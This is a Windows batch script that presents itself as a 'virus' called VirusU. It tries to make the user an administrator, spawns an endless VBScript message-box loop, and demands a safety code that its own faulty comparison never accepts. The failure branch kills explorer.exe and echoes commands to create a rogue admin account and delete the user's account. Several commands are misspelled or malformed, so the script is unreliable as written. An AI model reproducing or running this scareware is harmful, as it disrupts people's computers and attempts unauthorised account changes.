@echo off
title VirusU
color 0E
if exist AVU.dll goto chill
if not exist AVU.dll goto start

:chill
color 0A
title VirusU - You Are Safe
cls
echo File AVU.dll exist,
echo This computer is safe
pause >nul
exit

:start
color 0C
title VirusU
echo Adding %username%
echo as an Administrator...
ping localhost -n 3 >nul
net local /add Administartaors %username%
cls
echo Done!
ping localhost -n 3 >nul
cls
echo Prepearing to:...
echo DESTROYING THIS COMPUTER
ping localhost -n 3 >nul
cls
echo Time to Destroy
goto zemsta

:zemsta
cls
(
Do
x=MsgBox("YOU CAN'T STOP THIS",0+64,"VirusU")
Loop
)>YCST.vbs
ping localhost -n 1 >nul
start YCST.vbs
ping localhost -n 1 >nul
echo Enter Safety Code
echo Or say goodbay to your computer
echo.
set /p "code=Code: "
if code==Code2Disable goto good
if not code==Code2Disable goto wrong

:good
title VirusU / Good Code
color 0E
cls
(
echo VirusU
echo Special Code: Code2Disable
echo.
echo Virus created by:
echo EmojiTvYt
echo.
echo Github: 
echo https://github.com/EmojiTvYt
)>AVU.dll
echo Safety File Created
echo Your computer is safe
echo.
echo Don't delete file AVU.dll
echo.
echo Click Any Key to Exit
pause >nul
exit

:wrong
title VirusU / Wrong Code
color 0C
cls
echo You Konow The Rules,
echo And So Do I.. SAY GOODBAY
ping localhost -n 3 >nul
echo net user /add VirusU /passwordchg:VUPassword
echo net local /add Administartaors VirusU
echo net user /delete %username%
hutdown -s -t 10 -c Say Goodbay
taskkill /f /im explorer.exe
ping localhost -n 1 >nul
cls
echo Bay Bay
pause >nul
exit